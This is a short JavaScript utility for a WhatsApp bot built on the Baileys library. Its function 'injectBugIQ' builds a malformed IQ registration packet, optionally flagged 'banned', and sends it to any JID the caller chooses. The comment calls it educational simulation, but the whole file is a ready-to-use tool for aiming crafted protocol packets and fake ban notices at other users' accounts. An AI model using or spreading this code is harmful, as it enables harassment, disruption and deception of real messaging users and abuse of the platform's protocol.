// utils/injectBugIQ.js

/**
 * Injects a malformed or fake IQ packet to simulate a security scenario like a ban notice.
 * ⚠️ This is for educational and protective countermeasure simulation only.
 *
 * @param {object} sock - The active Baileys socket instance.
 * @param {object} options
 * @param {string} options.to - The JID to send the IQ to (e.g., 'user@s.whatsapp.net').
 * @param {boolean} options.ban - Whether to send a fake "ban" IQ.
 */
async function injectBugIQ(sock, { to, ban = false }) {
  try {
    const iqPayload = {
      tag: 'iq',
      attrs: {
        to: to || 's.whatsapp.net',
        type: 'set',
        id: 'reg-block',
        xmlns: 'w:reg'
      },
      content: ban
        ? [
            {
              tag: 'registration',
              attrs: {
                banned: 'true'
              },
              content: []
            }
          ]
        : []
    };

    console.log(`📤 Injecting IQ to: ${to} | Ban: ${ban}`);
    console.log('🧾 IQ Payload:', JSON.stringify(iqPayload, null, 2));

    await sock.sendNode(iqPayload);

    console.log(`✅ IQ sent successfully to ${to}`);
    return { status: 'sent', to };
  } catch (error) {
    console.error(`❌ Failed to inject IQ to ${to}:`, error.message);
    return { status: 'error', error };
  }
}


module.exports = {
  injectBugIQ
};
